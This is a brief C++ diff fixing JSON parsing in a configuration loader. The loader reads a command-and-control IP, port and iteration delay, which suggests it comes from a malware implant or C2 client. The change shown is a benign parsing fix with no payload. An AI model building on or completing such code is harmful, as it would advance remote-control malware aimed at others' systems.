@@ -14,7 +14,7 @@ static constexpr std::string_view ITERATION_DELAY = "iteration_delay";
 
 LiverConfiguration LiverConfiguration::parse(const Buffer& data)
 {
-	const Json config = Strings::to_string(data);
+	const Json config = Json::parse(Strings::to_string(data));
 
 	const uint32_t cnc_ip = Ip::parse_ip(config.at(std::string{Params::CNC_IP}).get<std::string>());
 	const uint16_t cnc_port = config.at(std::string{Params::CNC_PORT}).get<uint16_t>();
